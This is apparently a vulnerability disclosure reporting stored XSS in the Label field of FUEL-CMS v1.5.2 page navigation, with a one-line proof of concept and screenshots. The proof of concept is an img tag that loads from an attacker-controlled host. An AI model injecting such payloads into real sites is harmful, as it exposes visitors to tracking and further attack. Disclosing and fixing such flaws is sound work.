# Stored XSS vulnerability in FUEL-CMS v1.5.2 of the param Label in Page Navigation

**vender**:

- [daylightstudio/FUEL-CMS: A CodeIgniter Content Management System](https://github.com/daylightstudio/FUEL-CMS)

**SoftLink**:

- [Release 1.5.2 · daylightstudio/FUEL-CMS](https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.5.2)

**Vulnerable Param**

- Label in Navigation

**Version**

- v 1.5.2

### POC 

```
<img src="http://vps:2333" alt="dune">
```

![image-20250818214132204](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508182141343.png)



![image-20250818213912045](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508182139154.png)



![image-20250818213742869](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508182137189.png)